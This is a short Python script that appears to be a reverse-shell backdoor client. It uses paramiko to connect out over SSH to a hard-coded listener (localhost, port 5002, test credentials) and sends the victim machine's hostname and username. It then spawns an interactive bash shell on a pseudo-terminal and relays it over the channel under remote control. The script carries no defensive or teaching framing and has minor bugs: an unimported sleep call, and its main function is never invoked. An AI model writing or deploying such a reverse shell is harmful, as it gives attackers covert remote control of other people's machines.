#! /usr/bin/env python3

import paramiko
from threading import Thread
import subprocess
import os, pty, getpass, time

HOST = '127.0.0.1'
USERNAME = 'test'
PASSWORD = 'test'
PORT = 5002
killme = False
with open('/etc/hostname', 'r') as h:
    hostname = h.readline().strip('\n')
username = getpass.getuser()

def listen(pty, chan):
    while True:
        data = os.read(pty, 1024)
        chan.send(data)
        #chan.send(os.read(pty, 1024))
        time.sleep(0.25)

def run_ssh():
    if os.system("ping -c 1 " + HOST) == 0:
        with paramiko.SSHClient() as c:

            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
            chan = c.get_transport().open_session()
            chan.sendall(hostname)
            chan.sendall(username)

            #p =  PtyProcessUnicode.spawn(['/bin/bash', '-i'])
            mfd, sfd = pty.openpty()
            with subprocess.Popen(["/bin/bash", "-i"], stdin=sfd, stdout=sfd, stderr=sfd, start_new_session=True) as p:

                listen_thread = Thread(target=listen, args=(mfd, chan), daemon=True)
                listen_thread.start()
                while True:
                    if chan.recv_ready() is True:
                        data = chan.recv(1024)
                        if data == b'ping':
                            chan.send('pong')
                        os.write(mfd, data)
                        #os.write(mfd, chan.recv(1024))
                    time.sleep(0.25)
    else :
        sleep(20)
